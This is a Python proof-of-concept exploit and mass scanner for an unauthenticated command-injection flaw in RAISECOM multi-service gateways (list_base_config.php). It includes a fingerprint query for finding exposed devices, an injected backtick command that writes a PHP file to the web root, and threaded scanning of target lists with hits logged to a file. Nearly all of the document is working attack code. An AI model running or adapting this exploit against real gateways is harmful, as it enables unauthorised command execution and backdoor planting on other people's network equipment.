# -*- coding: utf-8 -*-
# 瑞斯康达(RAISECOM)-多业务智能网关 list_base_config.php 远程命令执行漏洞
# body="/images/raisecom/back.gif" && title=="Web user login"
# 产品简介：瑞斯康达多业务智能网关是一款集多种功能于一体的网络设备，专为中小企业及行业分支机构设计，以满足其多业务接入和带宽提速的需求，如MSG2100E系列、MSG2300系列等，是瑞斯康达科技发展股份有限公司推出的新一代网络产品。这些网关集成了数据、语音、安全、无线等多种功能，能够为用户提供综合、完整的网络接入解决方案。它们广泛应用于政企单位、商务楼宇、校园、工业园区等场景，为用户带来高效、便捷的网络体验。
# 漏洞概述：瑞斯康达-多业务智能网关 list_base_config.php 存在远程命令执行漏洞，未经身份验证的远程攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
\x1b[38m██████╗  █████╗ ██╗███████╗███████╗ ██████╗ ██████╗ ███╗   ███╗      ██████╗  ██████╗███████╗
\x1b[36m██╔══██╗██╔══██╗██║██╔════╝██╔════╝██╔════╝██╔═══██╗████╗ ████║      ██╔══██╗██╔════╝██╔════╝
\x1b[34m██████╔╝███████║██║███████╗█████╗  ██║     ██║   ██║██╔████╔██║█████╗██████╔╝██║     █████╗  
\x1b[35m██╔══██╗██╔══██║██║╚════██║██╔══╝  ██║     ██║   ██║██║╚██╔╝██║╚════╝██╔══██╗██║     ██╔══╝  
\x1b[31m██║  ██║██║  ██║██║███████║███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║      ██║  ██║╚██████╗███████╗
\x1b[33m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝      ╚═╝  ╚═╝ ╚═════╝╚══════╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:瑞斯康达(RAISECOM)-list_base_config.php 远程命令执行漏洞 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                 
\x1b[0m"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser('瑞斯康达(RAISECOM)-多业务智能网关_list_base_config.php_远程命令执行漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload1 = '/vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27hello123%27%3E%2Fwww%2Ftmp%2Ftest001.php%60'
    url_payload2 = '/tmp/test001.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
    }
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=5)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=5)
        # print(response.status_code)
        # print(response2.text)
        if response1.status_code == 200:
            if response2.status_code == 200 and 'hello123' in response2.text:
                print( f"[+] {target} 存在漏洞！\n")
                with open('RAISECOM_-RCE.txt','a',encoding='utf-8')as f:
                    f.write(target+url_payload2+'\n')
                    return True
            else:
                print("[-] 不存在漏洞！！")
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")

if __name__ == '__main__':
    main()